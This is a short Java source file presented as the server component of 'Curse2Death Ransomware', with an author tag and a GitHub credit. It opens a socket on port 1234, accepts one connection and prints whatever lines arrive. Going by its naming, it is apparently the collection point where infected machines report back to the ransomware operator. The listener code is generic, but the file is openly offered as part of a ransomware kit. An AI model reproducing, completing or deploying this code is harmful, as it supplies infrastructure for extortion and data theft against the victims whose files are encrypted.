/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package server_ransom;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.ServerSocket;
import java.net.Socket;
/**
 *
 * @author Predator0x300_Hacker
 */
public class Server_Ransom {

    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) throws IOException {
       System.out.println("\n~~~{+} Curse2Death Ransomware :: Github.com/M4xSec{+}~~~\n");
        ServerSocket ss=new ServerSocket(1234);
       Socket s=ss.accept();
       
       InputStreamReader isr=new InputStreamReader(s.getInputStream());
       BufferedReader br=new BufferedReader(isr);
       String line;
       while((line=br.readLine())!=null)
        System.out.println(line);br.close();s.close();ss.close();
    }
    
}
